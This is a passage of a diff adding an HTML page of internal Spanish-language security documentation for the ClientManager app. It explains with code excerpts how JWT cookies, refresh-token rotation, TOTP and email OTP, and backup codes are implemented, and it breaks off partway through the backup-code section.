@@ -1,0 +1,1172 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ClientManager — Seguridad: Guía de Implementación</title>
+<style>
+:root { --primary: #4f46e5; --bg: #ffffff; --bg-secondary: #f8fafc; --bg-code: #0f172a; --text: #1e293b; --text-muted: #64748b; --border: #e2e8f0; --green: #059669; --orange: #d97706; --red: #dc2626; }
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body { font-family: 'Segoe UI', system-ui, sans-serif; color: var(--text); background: var(--bg); line-height: 1.75; font-size: 16px; }
+.layout { display: flex; min-height: 100vh; }
+aside { width: 270px; min-width: 270px; background: var(--bg-secondary); border-right: 1px solid var(--border); padding: 1.5rem 1.25rem; position: sticky; top: 0; height: 100vh; overflow-y: auto; font-size: 0.82rem; }
+.logo { display: flex; align-items: center; gap: 0.6rem; padding-bottom: 1.25rem; margin-bottom: 1.25rem; border-bottom: 1px solid var(--border); }
+.logo-badge { width: 34px; height: 34px; background: #dc2626; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: white; font-weight: 800; font-size: 0.85rem; flex-shrink: 0; }
+.logo-text { font-weight: 700; color: var(--text); line-height: 1.3; }
+.logo-sub { font-size: 0.7rem; color: var(--text-muted); }
+aside h5 { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); font-weight: 700; margin: 1.25rem 0 0.4rem; }
+aside ul { list-style: none; }
+aside ul li a { display: block; padding: 0.3rem 0.6rem; border-radius: 5px; color: var(--text-muted); text-decoration: none; transition: all 0.12s; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+aside ul li a:hover { background: var(--border); color: var(--primary); }
+aside ul.sub { margin-left: 0.75rem; }
+aside ul.sub li a { font-size: 0.78rem; padding: 0.22rem 0.5rem; }
+main { flex: 1; min-width: 0; }
+.cover { background: linear-gradient(135deg, #0f172a 0%, #3b0764 40%, #7c2d12 100%); color: white; padding: 4rem 4.5rem; position: relative; overflow: hidden; }
+.cover::after { content: ''; position: absolute; top: -50%; right: -10%; width: 600px; height: 600px; background: radial-gradient(circle, rgba(220,38,38,0.2) 0%, transparent 65%); pointer-events: none; }
+.cover-chip { display: inline-block; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 20px; padding: 0.2rem 0.8rem; font-size: 0.7rem; letter-spacing: 0.08em; text-transform: uppercase; color: rgba(255,255,255,0.6); margin-bottom: 1.25rem; }
+.cover h1 { font-size: 2.5rem !important; font-weight: 800; letter-spacing: -0.03em; line-height: 1.15; color: white !important; border: none !important; margin: 0 0 1rem !important; padding: 0 !important; }
+.cover p { color: rgba(255,255,255,0.65); font-size: 1rem; max-width: 600px; margin: 0 0 2rem !important; }
+.cover-stats { display: flex; gap: 2.5rem; flex-wrap: wrap; }
+.cover-stat { display: flex; flex-direction: column; gap: 0.15rem; }
+.cover-stat-label { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 0.08em; color: rgba(255,255,255,0.4); }
+.cover-stat-value { font-size: 0.9rem; font-weight: 700; color: rgba(255,255,255,0.95); }
+.content { padding: 3rem 4.5rem; max-width: 920px; }
+h1 { font-size: 1.85rem; font-weight: 800; letter-spacing: -0.02em; margin: 3rem 0 1rem; color: var(--text); padding-bottom: 0.65rem; border-bottom: 3px solid var(--primary); }
+h2 { font-size: 1.35rem; font-weight: 700; margin: 2.5rem 0 0.65rem; color: var(--text); padding: 0.65rem 1rem; background: var(--bg-secondary); border-left: 4px solid var(--primary); border-radius: 0 8px 8px 0; }
+h2.red { border-left-color: var(--red); }
+h2.green { border-left-color: var(--green); }
+h2.orange { border-left-color: var(--orange); }
+h3 { font-size: 1.1rem; font-weight: 700; margin: 2rem 0 0.5rem; color: var(--text); }
+h4 { font-size: 0.82rem; font-weight: 700; margin: 1.5rem 0 0.4rem; color: var(--primary); text-transform: uppercase; letter-spacing: 0.05em; }
+p { margin: 0.75rem 0; }
+strong { font-weight: 700; }
+ul, ol { margin: 0.65rem 0 0.65rem 1.5rem; }
+li { margin: 0.3rem 0; }
+blockquote { background: #eff6ff; border-left: 4px solid var(--primary); padding: 0.85rem 1.25rem; margin: 1.25rem 0; border-radius: 0 8px 8px 0; color: #1e40af; }
+blockquote.warn { background: #fffbeb; border-left-color: var(--orange); color: #92400e; }
+blockquote.ok { background: #f0fdf4; border-left-color: var(--green); color: #166534; }
+blockquote.danger { background: #fef2f2; border-left-color: var(--red); color: #991b1b; }
+hr { border: none; border-top: 1px solid var(--border); margin: 2rem 0; }
+a { color: var(--primary); text-decoration: none; }
+a:hover { text-decoration: underline; }
+code { background: #f1f5f9; color: #be123c; padding: 0.12em 0.4em; border-radius: 4px; font-size: 0.85em; font-family: 'Cascadia Code', 'Consolas', monospace; }
+pre { background: var(--bg-code); border-radius: 10px; padding: 1.5rem; margin: 1.25rem 0; overflow-x: auto; }
+pre code { background: transparent; color: #cbd5e1; padding: 0; font-size: 0.82rem; line-height: 1.65; }
+table { width: 100%; border-collapse: collapse; margin: 1.25rem 0; font-size: 0.875rem; border-radius: 8px; overflow: hidden; border: 1px solid var(--border); }
+thead { background: var(--primary); }
+th { padding: 0.65rem 1rem; text-align: left; font-weight: 600; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.06em; color: white; }
+td { padding: 0.6rem 1rem; border-bottom: 1px solid var(--border); vertical-align: top; }
+tr:last-child td { border-bottom: none; }
+tbody tr:nth-child(even) { background: var(--bg-secondary); }
+tbody tr:hover { background: #eff6ff; }
+.flow { background: var(--bg-code); color: #cbd5e1; border-radius: 10px; padding: 1.25rem 1.5rem; margin: 1.25rem 0; font-family: 'Cascadia Code', 'Consolas', monospace; font-size: 0.82rem; line-height: 1.9; }
+.file-ref { background: #f1f5f9; border: 1px solid var(--border); border-radius: 6px; padding: 0.5rem 0.875rem; margin: 0.75rem 0; font-family: 'Cascadia Code', monospace; font-size: 0.82rem; color: #475569; display: inline-block; }
+.two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin: 1.25rem 0; }
+.card { background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 10px; padding: 1.25rem; }
+.layer-grid { display: flex; flex-direction: column; gap: 0.5rem; margin: 1.25rem 0; }
+.layer { display: flex; align-items: center; gap: 1rem; padding: 0.75rem 1rem; border-radius: 8px; border: 1px solid var(--border); background: #fff; }
+.layer-num { width: 28px; height: 28px; border-radius: 6px; background: var(--primary); color: white; font-weight: 700; font-size: 0.82rem; display: grid; place-items: center; flex-shrink: 0; }
+.layer-title { font-weight: 600; font-size: 0.9rem; color: var(--text); min-width: 200px; }
+.layer-desc { font-size: 0.82rem; color: var(--text-muted); }
+.layer-file { font-size: 0.75rem; color: var(--primary); font-family: monospace; margin-left: auto; flex-shrink: 0; }
+@media print { aside { display: none; } .content { padding: 1.5rem; max-width: 100%; } .cover { padding: 2rem; } pre { white-space: pre-wrap; } }
+@media (max-width: 900px) { aside { display: none; } .content { padding: 2rem; } .cover { padding: 2rem; } .two-col { grid-template-columns: 1fr; } }
+</style>
+</head>
+<body>
+<div class="layout">
+
+<!-- ── SIDEBAR ── -->
+<aside>
+  <div class="logo">
+    <div class="logo-badge">🔒</div>
+    <div><div class="logo-text">ClientManager</div><div class="logo-sub">Seguridad — Implementación</div></div>
+  </div>
+  <h5>Contenido</h5>
+  <ul>
+    <li><a href="#1-capas">1. Las 8 capas de seguridad</a></li>
+    <li><a href="#2-jwt">2. JWT en cookie HttpOnly</a></li>
+    <ul class="sub">
+      <li><a href="#21-emision">2.1 Emisión del token</a></li>
+      <li><a href="#22-cookie">2.2 La cookie</a></li>
+      <li><a href="#23-validacion">2.3 Validación por request</a></li>
+      <li><a href="#24-securitystamp">2.4 SecurityStamp</a></li>
+    </ul>
+    <li><a href="#3-refresh">3. Refresh token rotativo</a></li>
+    <ul class="sub">
+      <li><a href="#31-creacion">3.1 Creación</a></li>
+      <li><a href="#32-rotacion">3.2 Rotación</a></li>
+      <li><a href="#33-revocacion">3.3 Revocación</a></li>
+      <li><a href="#34-frontend">3.4 Refresh automático en el frontend</a></li>
+    </ul>
+    <li><a href="#4-mfa">4. Doble factor (MFA)</a></li>
+    <ul class="sub">
+      <li><a href="#41-totp">4.1 TOTP — Google Authenticator</a></li>
+      <li><a href="#42-emailotp">4.2 Email OTP</a></li>
+      <li><a href="#43-backupcodes">4.3 Códigos de respaldo</a></li>
+    </ul>
+    <li><a href="#5-lockout">5. Lockout de cuentas</a></li>
+    <li><a href="#6-ratelimit">6. Rate limiting</a></li>
+    <li><a href="#7-cors">7. CORS y SameSite</a></li>
+    <li><a href="#8-https">8. HTTPS y HSTS</a></li>
+    <li><a href="#9-fileupload">9. Validación de archivos</a></li>
+    <li><a href="#10-guards">10. Guards del frontend</a></li>
+    <li><a href="#11-xss">11. Protección XSS</a></li>
+    <li><a href="#12-passwords">12. Contraseñas</a></li>
+    <li><a href="#13-antienum">13. Anti-enumeración</a></li>
+    <li><a href="#14-secretos">14. Gestión de secretos</a></li>
+    <li><a href="#15-limpieza">15. Limpieza automática</a></li>
+    <li><a href="#16-sqlinj">16. SQL Injection</a></li>
+    <li><a href="#17-flujos">17. Flujos de ataque y defensa</a></li>
+  </ul>
+</aside>
+
+<!-- ── MAIN ── -->
+<main>
+<div class="cover">
+  <div class="cover-chip">Documentación Interna · Seguridad</div>
+  <h1>Seguridad de ClientManager<br>Guía completa de implementación</h1>
+  <p>Dónde está implementada cada medida de seguridad, qué archivo, qué líneas, cómo funciona por dentro y por qué se tomó cada decisión.</p>
+  <div class="cover-stats">
+    <div class="cover-stat"><span class="cover-stat-label">Capas de seguridad</span><span class="cover-stat-value">8 capas</span></div>
+    <div class="cover-stat"><span class="cover-stat-label">MFA</span><span class="cover-stat-value">TOTP + Email OTP</span></div>
+    <div class="cover-stat"><span class="cover-stat-label">Tokens</span><span class="cover-stat-value">JWT 15min + Refresh 24h</span></div>
+    <div class="cover-stat"><span class="cover-stat-label">Rate limit</span><span class="cover-stat-value">5 req/min por IP</span></div>
+    <div class="cover-stat"><span class="cover-stat-label">Lockout</span><span class="cover-stat-value">5 intentos / 1 min</span></div>
+  </div>
+</div>
+
+<div class="content">
+
+<!-- ─────────────────────────── 1 ─────────────────────────── -->
+<h1 id="1-capas">1. Las 8 capas de seguridad</h1>
+
+<p>La seguridad está en capas. Un atacante tiene que superar <strong>todas</strong> para causar daño real. Si una falla, las demás contienen el daño.</p>
+
+<div class="layer-grid">
+  <div class="layer">
+    <div class="layer-num">1</div>
+    <div class="layer-title">Transporte — HTTPS + HSTS</div>
+    <div class="layer-desc">Todo el tráfico cifrado. El navegador fuerza HTTPS durante 30 días.</div>
+    <div class="layer-file">Program.cs</div>
+  </div>
+  <div class="layer">
+    <div class="layer-num">2</div>
+    <div class="layer-title">Origen — CORS + SameSite</div>
+    <div class="layer-desc">Solo se acepta el origen configurado. Las cookies no viajan a otros dominios.</div>
+    <div class="layer-file">Program.cs · AuthController.cs</div>
+  </div>
+  <div class="layer">
+    <div class="layer-num">3</div>
+    <div class="layer-title">Frecuencia — Rate Limiting</div>
+    <div class="layer-desc">5 peticiones por minuto por IP en endpoints de auth.</div>
+    <div class="layer-file">Program.cs · AuthController.cs</div>
+  </div>
+  <div class="layer">
+    <div class="layer-num">4</div>
+    <div class="layer-title">Autenticación — JWT + SecurityStamp</div>
+    <div class="layer-desc">Token firmado de 15 min en cookie HttpOnly. SecurityStamp revalidado en cada request.</div>
+    <div class="layer-file">Program.cs · AuthService.cs</div>
+  </div>
+  <div class="layer">
+    <div class="layer-num">5</div>
+    <div class="layer-title">MFA — TOTP y Email OTP</div>
+    <div class="layer-desc">Segundo factor obligatorio: TOTP para SuperAdmin, Email OTP para Clientes.</div>
+    <div class="layer-file">AuthService.cs · mfa-verificar.ts</div>
+  </div>
+  <div class="layer">
+    <div class="layer-num">6</div>
+    <div class="layer-title">Autorización — Roles y Guards</div>
+    <div class="layer-desc">[Authorize(Roles)] en el backend. Guards funcionales en el frontend.</div>
+    <div class="layer-file">Controllers · guards/</div>
+  </div>
+  <div class="layer">
+    <div class="layer-num">7</div>
+    <div class="layer-title">Validación de entrada y archivos</div>
+    <div class="layer-desc">DTOs con DataAnnotations. Uploads: extensión + MIME + magic bytes.</div>
+    <div class="layer-file">DTOs/ · CompanyService.cs</div>
+  </div>
+  <div class="layer">
+    <div class="layer-num">8</div>
+    <div class="layer-title">Protección de datos y outputs</div>
+    <div class="layer-desc">Hashes en BD. Identidad en memoria. Angular escapa por defecto. Sin localStorage sensible.</div>
+    <div class="layer-file">AuthService.cs · auth.service.ts</div>
+  </div>
+</div>
+
+
+<!-- ─────────────────────────── 2 ─────────────────────────── -->
+<h1 id="2-jwt">2. JWT en cookie HttpOnly</h1>
+
+<p>El JWT (JSON Web Token) es el mecanismo principal de autenticación. En lugar de enviarlo en el header <code>Authorization: Bearer ...</code> (como hacen muchas apps), aquí viaja en una <strong>cookie HttpOnly</strong>. Eso significa que JavaScript no puede leerla — aunque hubiera un ataque XSS, el atacante no puede robar el token.</p>
+
+<h2 id="21-emision">2.1 Emisión del token</h2>
+
+<div class="file-ref">📄 AplicacionAPI/ClientManager.API/Services/AuthService.cs — GenerateAccessToken()</div>
+
+<pre><code>private string GenerateAccessToken(ApplicationUser user, string role, out DateTime expiresAt)
+{
+    var claims = new List&lt;Claim&gt;
+    {
+        new(JwtRegisteredClaimNames.Sub,   user.Id),          // ID del usuario
+        new(JwtRegisteredClaimNames.Email, user.Email!),      // email
+        new(JwtRegisteredClaimNames.Jti,   Guid.NewGuid().ToString()), // ID único del token
+        new("role",          role),                           // rol: SuperAdmin o Cliente
+        new("securityStamp", user.SecurityStamp ?? "")        // para invalidación inmediata
+    };
+
+    // Claims adicionales según rol:
+    if (role == "SuperAdmin")
+        claims.Add(new Claim("totpEnabled", user.TotpEnabled.ToString().ToLower()));
+    if (role == "Cliente" && user.UserId.HasValue)
+        claims.Add(new Claim("userId", user.UserId.Value.ToString()));
+
+    // Firma con HMAC-SHA256 usando la clave secreta de User Secrets
+    var key   = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(secretKey));
+    var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);
+
+    expiresAt = DateTime.UtcNow.AddMinutes(15);  // expira en 15 minutos
+
+    var token = new JwtSecurityToken(
+        issuer:            "ClientManagerAPI",
+        audience:          "ClientManagerApp",
+        claims:            claims,
+        expires:           expiresAt,
+        signingCredentials: creds
+    );
+
+    return new JwtSecurityTokenHandler().WriteToken(token);
+}</code></pre>
+
+<p>El token contiene: quién eres (Sub/Email), qué puedes hacer (role), cuándo expira (exp), un ID único (Jti) y el SecurityStamp para invalidación. Todo firmado — si alguien modifica cualquier campo, la firma no cuadra y el backend lo rechaza.</p>
+
+<h2 id="22-cookie">2.2 La cookie</h2>
+
+<div class="file-ref">📄 AplicacionAPI/ClientManager.API/Controllers/AuthController.cs — SetAccessTokenCookie()</div>
+
+<pre><code>private void SetAccessTokenCookie(string token)
+{
+    Response.Cookies.Append("accessToken", token, new CookieOptions
+    {
+        HttpOnly = true,                    // JavaScript NO puede leerla
+        Secure   = _isProduction,           // solo por HTTPS en producción
+        SameSite = SameSiteMode.Strict,     // no viaja en peticiones cross-site
+        Expires  = DateTimeOffset.UtcNow.AddMinutes(15)
+    });
+}
+
+private void SetRefreshTokenCookie(string token)
+{
+    Response.Cookies.Append("refreshToken", token, new CookieOptions
+    {
+        HttpOnly = true,
+        Secure   = _isProduction,
+        SameSite = SameSiteMode.Strict,
+        Expires  = DateTimeOffset.UtcNow.AddHours(24)
+    });
+}</code></pre>
+
+<table>
+  <thead><tr><th>Flag</th><th>Qué hace</th><th>Qué ataque previene</th></tr></thead>
+  <tbody>
+    <tr><td><code>HttpOnly</code></td><td>JavaScript no puede acceder a la cookie</td><td>Robo de token via XSS</td></tr>
+    <tr><td><code>Secure</code></td><td>Solo se envía por HTTPS</td><td>Interceptación en tránsito (MITM)</td></tr>
+    <tr><td><code>SameSite=Strict</code></td><td>No se envía en peticiones de otros dominios</td><td>CSRF (Cross-Site Request Forgery)</td></tr>
+  </tbody>
+</table>
+
+<h2 id="23-validacion">2.3 Validación en cada request</h2>
+
+<div class="file-ref">📄 AplicacionAPI/ClientManager.API/Program.cs — líneas 53-96</div>
+
+<pre><code>// Leer el token desde la cookie (no del header Authorization)
+options.Events = new JwtBearerEvents
+{
+    OnMessageReceived = ctx =>
+    {
+        var cookie = ctx.Request.Cookies["accessToken"];
+        if (!string.IsNullOrEmpty(cookie))
+            ctx.Token = cookie;      // usar la cookie en lugar del header
+        return Task.CompletedTask;
+    }
+}
+
+// Parámetros de validación:
+ValidateIssuer           = true,    // debe ser "ClientManagerAPI"
+ValidateAudience         = true,    // debe ser "ClientManagerApp"
+ValidateLifetime         = true,    // no aceptar tokens expirados
+ValidateIssuerSigningKey = true,    // verificar la firma HMAC-SHA256
+ClockSkew                = TimeSpan.Zero  // sin margen de tiempo — expira al segundo</code></pre>
+
+<blockquote>
+  <strong>ClockSkew = Zero:</strong> por defecto ASP.NET da 5 minutos de margen tras la expiración. Con Zero se elimina ese margen — si el token dice que expira a las 12:15:00, a las 12:15:01 ya no vale.
+</blockquote>
+
+<h2 id="24-securitystamp">2.4 SecurityStamp — invalidación inmediata</h2>
+
+<div class="file-ref">📄 Program.cs — OnTokenValidated (líneas 80-95)</div>
+
+<pre><code>OnTokenValidated = async ctx =>
+{
+    var userManager = ctx.HttpContext.RequestServices
+        .GetRequiredService&lt;UserManager&lt;ApplicationUser&gt;&gt;();
+
+    var userId = ctx.Principal?.FindFirst(JwtRegisteredClaimNames.Sub)?.Value;
+    var user   = await userManager.FindByIdAsync(userId);
+
+    var tokenStamp = ctx.Principal?.FindFirst("securityStamp")?.Value;
+    if (tokenStamp != user.SecurityStamp)
+        ctx.Fail("Sesión invalidada.");  // → 401 inmediato
+}</code></pre>
+
+<p>El <code>SecurityStamp</code> es un GUID que Identity regenera automáticamente cuando cambias la contraseña, el email o los roles. Se incluye en el JWT al firmarlo. En <strong>cada request</strong>, el backend lo compara con el de la BD. Si no coincide → 401.</p>
+
+<blockquote class="ok">
+  <strong>¿Para qué sirve?</strong> Si alguien roba el JWT de un usuario y ese usuario cambia su contraseña, el stamp cambia. El siguiente request del atacante recibe 401 aunque el JWT aún no haya expirado. Invalidación inmediata sin esperar los 15 minutos.
+</blockquote>
+
+
+<!-- ─────────────────────────── 3 ─────────────────────────── -->
+<h1 id="3-refresh">3. Refresh token rotativo</h1>
+
+<p>El access token (JWT) dura solo 15 minutos para limitar el daño si es interceptado. Pero obligar al usuario a hacer login cada 15 minutos sería horrible. Los refresh tokens resuelven esto: permiten obtener un nuevo access token sin hacer login.</p>
+
+<h2 id="31-creacion">3.1 Creación</h2>
+
+<div class="file-ref">📄 AuthService.cs — CreateRefreshTokenAsync()</div>
+
+<pre><code>private async Task&lt;RefreshToken&gt; CreateRefreshTokenAsync(string userId)
+{
+    var tokenBytes = new byte[32];
+    RandomNumberGenerator.Fill(tokenBytes);  // 32 bytes aleatorios criptográficamente seguros
+
+    var refreshToken = new RefreshToken
+    {
+        Token     = Convert.ToBase64String(tokenBytes),  // 256 bits de entropía
+        UserId    = userId,
+        ExpiresAt = DateTime.UtcNow.AddHours(24)         // válido 24 horas
+    };
+
+    _db.RefreshTokens.Add(refreshToken);
+    await _db.SaveChangesAsync();
+    return refreshToken;
+}</code></pre>
+
+<p>El modelo en BD tiene: <code>Token</code>, <code>UserId</code>, <code>ExpiresAt</code>, <code>RevokedAt</code>, <code>ReplacedByToken</code>. La propiedad <code>IsActive</code> se calcula: <code>RevokedAt is null && DateTime.UtcNow &lt; ExpiresAt</code>.</p>
+
+<div class="file-ref">📄 Models/RefreshToken.cs</div>
+
+<h2 id="32-rotacion">3.2 Rotación — cada uso genera uno nuevo</h2>
+
+<div class="file-ref">📄 AuthService.cs — RefreshAsync()</div>
+
+<pre><code>public async Task&lt;TokenResponseDto&gt; RefreshAsync(string refreshToken)
+{
+    var stored = await _db.RefreshTokens
+        .Include(r => r.User)
+        .FirstOrDefaultAsync(r => r.Token == refreshToken);
+
+    if (stored is null || !stored.IsActive)
+        throw new UnauthorizedAccessException("Refresh token inválido o expirado.");
+
+    // Generar nuevos tokens
+    var newAccessToken  = GenerateAccessToken(user, role, out var expiresAt);
+    var newRefreshToken = await CreateRefreshTokenAsync(user.Id);
+
+    // Revocar el token antiguo y registrar cuál lo reemplaza
+    stored.RevokedAt       = DateTime.UtcNow;
+    stored.ReplacedByToken = newRefreshToken.Token;  // trazabilidad
+    await _db.SaveChangesAsync();
+
+    return new TokenResponseDto { AccessToken = newAccessToken, RefreshToken = newRefreshToken.Token, ... };
+}</code></pre>
+
+<blockquote class="ok">
+  <strong>Por qué la rotación es importante:</strong> si alguien roba un refresh token, puede usarlo una sola vez. En el momento en que el usuario legítimo intenta refrescar, usa el mismo token pero ya fue revocado → 401. La cadena <code>ReplacedByToken</code> permite detectar que ese token ya fue usado y que hay una posible sesión comprometida.
+</blockquote>
+
+<h2 id="33-revocacion">3.3 Revocación</h2>
+
+<p>Hay tres situaciones donde se revocan refresh tokens:</p>
+
+<table>
+  <thead><tr><th>Situación</th><th>Qué se revoca</th><th>Archivo</th></tr></thead>
+  <tbody>
+    <tr><td>Logout</td><td>Solo el refresh token activo actual</td><td>AuthService.cs — RevokeAsync()</td></tr>
+    <tr><td>Cambio de contraseña</td><td>Todos los refresh tokens activos del usuario</td><td>AuthService.cs — ResetPasswordAsync()</td></tr>
+    <tr><td>Uso del refresh</td><td>El token usado (se emite uno nuevo)</td><td>AuthService.cs — RefreshAsync()</td></tr>
+  </tbody>
+</table>
+
+<pre><code>// Al cambiar contraseña — revocar TODAS las sesiones activas:
+var activeTokens = _db.RefreshTokens
+    .Where(r => r.UserId == user.Id && r.RevokedAt == null && r.ExpiresAt > DateTime.UtcNow);
+await activeTokens.ForEachAsync(t => t.RevokedAt = DateTime.UtcNow);
+await _db.SaveChangesAsync();</code></pre>
+
+<h2 id="34-frontend">3.4 Refresh automático en el frontend</h2>
+
+<div class="file-ref">📄 AplicacionAPI/ClientManagerWeb/src/app/interceptors/auth.interceptor.ts</div>
+
+<pre><code>// Candado global — compartido entre TODAS las peticiones
+let isRefreshing = false;
+const refreshResult$ = new BehaviorSubject&lt;boolean | null&gt;(null);
+
+// Cuando llega un 401:
+if (isRefreshing) {
+    // Otra petición ya está renovando — esperar al resultado
+    return refreshResult$.pipe(
+        filter(result => result !== null),
+        take(1),
+        switchMap(success => success ? next(reqWithCreds) : throwError(() => error))
+    );
+}
+
+// Primera petición en fallar: tomar el control
+isRefreshing = true;
+refreshResult$.next(null);
+
+return from(authService.refresh()).pipe(
+    switchMap(success => {
+        isRefreshing = false;
+        refreshResult$.next(success);  // notificar a las peticiones en espera
+        return success ? next(reqWithCreds) : throwError(() => error);
+    })
+);</code></pre>
+
+<blockquote>
+  El candado evita que si llegan 5 peticiones simultáneas con 401, las 5 intenten hacer el refresh a la vez. Solo una lo hace. Las demás esperan el resultado en el <code>BehaviorSubject</code> y reintentan cuando termina.
+</blockquote>
+
+
+<!-- ─────────────────────────── 4 ─────────────────────────── -->
+<h1 id="4-mfa">4. Doble factor (MFA)</h1>
+
+<p>Ambos roles tienen MFA obligatorio pero de distinto tipo:</p>
+
+<div class="two-col">
+  <div class="card">
+    <h4>SuperAdmin → TOTP</h4>
+    <p>Google Authenticator genera un código nuevo cada 30 segundos. No requiere conexión a internet ni email. El secreto está en el móvil.</p>
+  </div>
+  <div class="card">
+    <h4>Cliente → Email OTP</h4>
+    <p>Se envía un código de 6 dígitos al email. Expira en 30 segundos. Máximo 3 intentos antes de invalidarse.</p>
+  </div>
+</div>
+
+<h2 id="41-totp">4.1 TOTP — Google Authenticator</h2>
+
+<div class="file-ref">📄 AuthService.cs — TotpSetupAsync(), TotpConfirmAsync(), MfaVerifyAsync()</div>
+<div class="file-ref">📄 Librería: OtpNet (Otp.NET v1.4.1)</div>
+
+<h4>Setup — configurar el TOTP por primera vez</h4>
+<pre><code>// 1. Generar secreto aleatorio de 160 bits (estándar RFC 4226)
+var secretBytes = KeyGeneration.GenerateRandomKey(20);
+var secret      = Base32Encoding.ToString(secretBytes);  // codificado en Base32
+
+// 2. Guardar en BD (aún no activado — TotpEnabled sigue false)
+user.TotpSecret = secret;
+await _userManager.UpdateAsync(user);
+
+// 3. Generar URI para el QR
+var qrUri = $"otpauth://totp/ClientManager:{email}?secret={secret}&issuer=ClientManager&algorithm=SHA1&digits=6&period=30";</code></pre>
+
+<p>El QR se genera en el <strong>frontend</strong> con la librería <code>qrcode</code>:</p>
+
+<div class="file-ref">📄 pages/configurar-totp/configurar-totp.ts</div>
+<pre><code>const imgUrl = await QRCode.toDataURL(data.qrUri, {
+    width: 220, margin: 2,
+    color: { dark: '#0B0F1A', light: '#ffffff' }
+});
+this.qrDataUrl.set(imgUrl);  // se asigna al src de una img</code></pre>
+
+<h4>Confirmación — verificar el primer código</h4>
+<pre><code>// Verificar el código con ventana de tolerancia RFC (±30s para relojes desincronizados)
+var totp  = new Totp(Base32Encoding.ToBytes(user.TotpSecret));
+var valid = totp.VerifyTotp(DateTime.UtcNow, code, out _, VerificationWindow.RfcSpecifiedNetworkDelay);
+
+if (!valid) throw new ArgumentException("Código incorrecto.");
+
+// Activar TOTP
+user.TotpEnabled = true;
+await _userManager.UpdateAsync(user);</code></pre>
+
+<h4>Verificación en cada login</h4>
+<pre><code>// En MfaVerifyAsync():
+var totp  = new Totp(Base32Encoding.ToBytes(user.TotpSecret));
+var valid = totp.VerifyTotp(DateTime.UtcNow, dto.Code, out _, VerificationWindow.RfcSpecifiedNetworkDelay);
+if (!valid)
+    throw new UnauthorizedAccessException("Código incorrecto.");</code></pre>
+
+<h4>TOTP obligatorio — enforced por el adminGuard</h4>
+<div class="file-ref">📄 guards/admin.guard.ts</div>
+<pre><code>// Si el SuperAdmin no tiene TOTP activo, no puede acceder al panel
+if (!authService.totpEnabled())
+    return router.createUrlTree(['/configurar-totp']);</code></pre>
+
+<h2 id="42-emailotp">4.2 Email OTP</h2>
+
+<div class="file-ref">📄 AuthService.cs — LoginAsync(), ResendOtpAsync(), MfaVerifyAsync()</div>
+<div class="file-ref">📄 Models/EmailOtpCode.cs</div>
+
+<pre><code>// 1. Generar código de 6 dígitos con CSPRNG
+var bytes = new byte[4];
+RandomNumberGenerator.Fill(bytes);
+var code = (Math.Abs(BitConverter.ToInt32(bytes, 0)) % 1_000_000).ToString("D6");
+
+// 2. Hashear con SHA-256 antes de guardar en BD (nunca en claro)
+var codeHash = Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(code)));
+
+// 3. Guardar en BD
+_db.EmailOtpCodes.Add(new EmailOtpCode {
+    UserId    = user.Id,
+    CodeHash  = codeHash,
+    ExpiresAt = DateTime.UtcNow.AddSeconds(30),  // expira en 30 segundos
+    Attempts  = 0
+});
+
+// 4. Invalidar OTPs anteriores del mismo usuario
+var previousOtps = await _db.EmailOtpCodes
+    .Where(o => o.UserId == user.Id && !o.IsUsed && o.ExpiresAt > DateTime.UtcNow)
+    .ToListAsync();
+foreach (var old in previousOtps) old.IsUsed = true;</code></pre>
+
+<h4>Verificación con control de intentos</h4>
+<pre><code>// Máximo 3 intentos
+if (otp.Attempts >= 3) {
+    otp.IsUsed = true;
+    throw new UnauthorizedAccessException("Demasiados intentos. Inicia sesión de nuevo.");
+}
+
+// Comparar hash
+var inputHash = Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(dto.Code)));
+if (otp.CodeHash != inputHash) {
+    otp.Attempts++;
+    var remaining = 3 - otp.Attempts;
+    throw new UnauthorizedAccessException($"Código incorrecto. Te quedan {remaining} intentos.");
+}
+
+otp.IsUsed = true;  // marcar como usado — no se puede reutilizar</code></pre>
+
+<h4>Timer en el frontend</h4>
+<div class="file-ref">📄 pages/mfa-verificar/mfa-verificar.ts</div>
+<p>El frontend lee el timestamp de expiración del OTP que devuelve el servidor y muestra un contador regresivo. Cuando llega a 0, muestra "Código expirado" y bloquea el formulario.</p>
+
+<h2 id="43-backupcodes">4.3 Códigos de respaldo TOTP</h2>
+
+<div class="file-ref">📄 AuthService.cs — TotpConfirmAsync()</div>
+
+<pre><code>// Generar 8 códigos de respaldo al activar TOTP
+var plainCodes = Enumerable.Range(0, 8).Select(_ => {
+    var bytes = new byte[4];
+    RandomNumberGenerator.Fill(bytes);
+    var hex = Convert.ToHexString(bytes).ToLower();
+    return $"{hex[..4]}-{hex[4..]}";   // formato: xxxx-xxxx
+}).ToList();
+
+// Guardar SOLO los hashes SHA-256 en BD (nunca los códigos en claro)
+user.TotpBackupCodes = JsonSerializer.Serialize(
+    plainCodes.Select(c =>
+        Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(c.Replace("-", ""))))
+    ).ToList()
+);
+
+// Los códigos en claro se devuelven al usuario UNA SOLA VEZ en la respuesta</code></pre>
+
+<blockquote class="warn">
+  Los backup codes se muestran al usuario solo una vez al activar TOTP. Después no se pueden recuperar — solo los hashes están en BD. Si los pierde, tiene que desactivar y reactivar TOTP.
+</blockquote>
+
+<h4>Uso de un backup code</h4>
+<pre><code>// En MfaVerifyAsync() — si el código tiene 8 chars (sin guión) es backup
+var isBackupAttempt = normalizedCode.Length == 8;
+
+if (isBackupAttempt) {
+    var inputHash    = Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(normalizedCode)));
+    var storedHashes = JsonSerializer.Deserialize&lt;List&lt;string&gt;&gt;(user.TotpBackupCodes);
